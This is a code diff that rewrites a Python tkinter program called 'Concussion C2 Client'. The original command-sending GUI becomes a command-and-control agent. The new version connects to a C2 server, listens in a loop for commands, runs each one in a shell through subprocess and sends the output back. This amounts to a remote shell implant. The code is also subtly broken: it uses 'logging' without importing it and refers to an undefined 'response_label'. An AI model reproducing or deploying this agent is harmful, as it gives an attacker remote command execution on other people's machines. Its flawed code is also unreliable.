@@ -1,81 +1,102 @@
 import tkinter as tk
 import socket
 import threading
-import json
-
-# Define the server's IP address and port
-SERVER_IP = '127.0.0.1'
-SERVER_PORT = 8080
+import subprocess
 
 # Create the main application window
 root = tk.Tk()
 root.title("Concussion C2 Client")
-root.geometry("400x300")  # Adjust the window size as needed
+root.geometry("700x500")
 
-# 1. Use a Consistent Color Scheme
-primary_color = "#000098"
-secondary_color = "#2ecc71"
-background_color = "#000080"
-text_color = "#ffffff"
+# Define the common color scheme
+root.configure(bg="#000046")
 
-root.configure(bg=background_color)
+# Create a socket for the client
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Initialize the client socket
 
-# 2. Add Labels and Headings
-main_heading = tk.Label(root, text="Concussion C2 Client", font=("Helvetica", 16, "bold"), bg=primary_color, fg=text_color)
-main_heading.pack(pady=(20, 10))
+# Define the server's IP address and port
+SERVER_IP = '127.0.0.1'  # Replace with the actual IP address of your C2 server
+SERVER_PORT = 2222  # Replace with the actual port your server is listening on
 
-# Create a label for the server connection status
-status_label = tk.Label(root, text="Server Status: Not Connected", bg=background_color)
-status_label.pack(pady=10)
+error_message = None  # Initialize the error message variable
 
-# Create an entry field for user input
-command_var = tk.StringVar()  # Create a StringVar to hold the entry text
-command_var.set("Enter your command")  # Set the default text
-command_entry = tk.Entry(root, width=40, font=("Helvetica", 12), bg="#ffffff", textvariable=command_var)
-command_entry.pack()
+try:
+    print("Attempting to connect to the server...")
+    client_socket.connect((SERVER_IP, SERVER_PORT))
+    print("Connected to the server successfully.")
+except Exception as e:
+    error_message = f"Connection Error: {e}"
+    print(f"Error connecting to the server: {e}")
 
-# Function to send a command to the server
-def send_command():
-    command = command_var.get()
-    if command and command != "Enter your command":
-        try:
-            # Create a socket and establish a connection to the server
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.connect((SERVER_IP, SERVER_PORT))
+# Define and initialize the status label
+status_label = tk.Label(root, text="Connection Status: Connecting...", font=("Helvetica", 16, "bold"), bg="#000046", fg="#00C8FF")
+status_label.pack(padx=10, pady=10)
 
-            # Define a command dictionary with a "type" and "data" field
-            command_data = {"type": "command", "data": command}
-            # Serialize the command as JSON and send it to the server
-            client_socket.send(json.dumps(command_data).encode('utf-8'))
+# Function to update the response label
+def update_response(message):
+    if error_message:
+        message = error_message  # If an error occurred, display it
+    response_label.config(text=message)
 
-            # Receive and process the response from the server
-            response_data = client_socket.recv(1024).decode('utf-8')
-            response = json.loads(response_data)
+# Function to handle commands from the server (unchanged)
+def handle_command(command):
+    try:
+        result = execute_command(command)
+        update_response(result)
+        send_response_to_server(result)
+    except Exception as e:
+        update_response(f"Error: {e}")
+
+# Function to execute commands
+def execute_command(command):
+    try:
+        # Use subprocess to run the command with administrative privileges
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output, error = process.communicate()
+
+        # Check if the command was successful
+        if process.returncode == 0:
+            return f"Command executed successfully:\n\n{output.decode('utf-8')}"
+        else:
+            return f"Command failed with error:\n\n{error.decode('utf-8')}"
+
+    except Exception as e:
+        return f"Error: {e}"
+
+# Function to send responses to the server
+def send_response_to_server(response):
+    try:
+        if client_socket is not None:
+            # Send the response to the server
+            client_socket.send(response.encode('utf-8'))
+
+    except Exception as e:
+        update_response(f"Error sending response to server: {e}")
+
+# Function to listen for commands from the server
+def listen_for_commands():
+    try:
+        while True:
+            if client_socket is not None:
+                command = client_socket.recv(1024).decode('utf-8')
+                if not command:
+                    break
+
+                handle_command(command)
+
+    except Exception as e:
+        update_response(f"Error in command_listener_thread: {e}")
+        logging.error(f"Error in command_listener_thread: {e}")
+        # You can also choose to terminate the thread or take other actions here
+    finally:
+        # Close the client socket when the thread exits
+        if client_socket is not None:
+            client_socket.close()
             
-            if response["type"] == "response":
-                # Process the response as needed (e.g., display it)
-                status_label.config(text=f"Server Status: Response - {response['data']}")
-            else:
-                status_label.config(text="Server Status: Invalid Response")
-
-            # Close the client socket
-            client_socket.close()
-        except Exception as e:
-            print(f"Error: {e}")
-
-            # Handle connection or other errors gracefully
-            status_label.config(text=f"Server Status: Error - {e}")
-
-            # Close the client socket if an error occurs
-            client_socket.close()
-
-            # Optionally, you can log the error for debugging
-
-# 3. Improve Button Styling
-send_button = tk.Button(root, text="Send Command", bg=secondary_color, fg=text_color, command=send_command)
-send_button.pack()
-
-# ... (Other GUI code)
+# Print a message when starting to listen for commands
+print("Starting to listen for commands from the server...")
+command_listener_thread = threading.Thread(target=listen_for_commands)
+command_listener_thread.start()
 
 # Run the GUI application
 root.mainloop()
